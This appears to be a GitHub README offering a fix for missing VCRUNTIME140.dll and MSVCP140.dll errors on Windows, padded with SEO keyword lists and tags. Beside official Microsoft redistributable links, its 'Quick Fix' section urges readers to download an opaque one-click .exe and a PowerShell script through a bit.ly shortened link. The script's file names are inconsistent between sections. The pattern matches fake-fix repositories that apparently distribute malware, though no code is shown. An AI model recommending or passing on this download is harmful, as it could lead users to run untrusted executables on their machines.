# 🧩 Fix: VCRUNTIME140.dll & MSVCP140.dll Missing or Not Found on Windows

This repository provides a full solution for fixing the common **“VCRUNTIME140.dll is missing”** and **“MSVCP140.dll is missing”** errors on Windows 10 and Windows 11. You can either download our one‑click `.exe` fix tool or follow the manual instructions below.

> ✅ **SEO Keywords**: VCRUNTIME140.dll missing, MSVCP140.dll missing, fix missing DLL Windows 10, fix missing DLL Windows 11, Visual C++ Redistributable, DLL not found fix

---

## ❗ Common Error Messages

```
The program can’t start because VCRUNTIME140.dll is missing from your computer.
Try reinstalling the program to fix this problem.
```
```
The program can’t start because MSVCP140.dll is missing from your computer.
Try reinstalling the program to fix this problem.
```

These errors usually appear when required system components from the **Microsoft Visual C++ Redistributable** are missing or corrupted.

---

## ✅ Quick Fix – Download the PS1 Repair Tool


  🛠 What the Script Fixes

The VCRUNTIME140.dll is missing error happens when your system is missing or has a corrupted Visual C++ runtime file that’s required by many apps and games.

🔧 This script will:

Check if VCRUNTIME140.dll exists in:

C:\Windows\System32

C:\Windows\SysWOW64

If missing, it will download official Visual C++ Redistributables (from Microsoft):

vc_redist.x64.exe

vc_redist.x86.exe

Silently install them in the background using:

/quiet /norestart

▶️ How to Run the .ps1 Script
- Right-click Fix-VCRUNTIME140.ps1
- Choose "Run with PowerShell"
- Wait for it to complete
- Restart your computer


Prompt you to restart your PC once the fix is complete.

📥 [Download Fix‐MissingDLLs.ps1](https://bit.ly/msvcp140dllmissing)





---

## 🛠 Manual Fix – Install Visual C++ Redistributables

If you prefer to fix the issue manually:

- [vc_redist.x64.exe (64‑bit)](https://aka.ms/vs/17/release/vc_redist.x64.exe)  
- [vc_redist.x86.exe (32‑bit)](https://aka.ms/vs/17/release/vc_redist.x86.exe)

### 📌 Steps:
1. Download both files  
2. Run each installer *as Administrator*  
3. Once complete, restart your PC  
4. Try launching the affected application again  

---

## 📦 Repository Contents

- `Fix‑MissingDLLs.exe` – Automatic repair tool  
- `Fix‑MissingDLLs.ps1` – PowerShell source script (fully readable)  
- `README.md` – You’re currently reading it  

---

## 📊 Downloads

![Downloads](https://img.shields.io/github/downloads/VCRUNTIME140dll/vcruntime140-dll-and-msvcp140-dll-missing-in-windows-10-11/total?style=for-the-badge&logo=github&logoColor=white)

---

## 💬 Feedback

If this solved your DLL issues, please ⭐ **star the repository** to show your support and help others find it.

Have questions? Need further support? Open an [issue](https://github.com/VCRUNTIME140dll/vcruntime140-dll-and-msvcp140-dll-missing-in-windows-10-11/issues).

---

## 🏷 Tags

`#VCRUNTIME140.dll` `#MSVCP140.dll` `#MissingDLL` `#VisualCpp` `#DLLFix` `#Windows10` `#Windows11` `#Redistributable` `#FixEXE`
